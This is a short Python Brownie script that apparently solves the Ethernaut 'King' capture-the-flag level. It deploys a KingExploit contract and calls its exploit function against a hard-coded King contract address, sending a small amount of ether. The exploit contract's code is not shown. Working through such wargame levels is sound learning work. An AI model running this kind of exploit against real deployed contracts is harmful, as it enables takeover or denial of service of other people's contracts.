from brownie import King,KingExploit, config,accounts

#input the contract address
#> contract.address
contractAddress = '0x496936A9D087Ef8519b2eCD9fbD74074DE949085'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    king = King.at(contractAddress)
    kingExploit = KingExploit.deploy({"from":player})
    kingExploit.exploit(king.address,{"from":player,"value":1000000000000001})

def main():
    solution()
    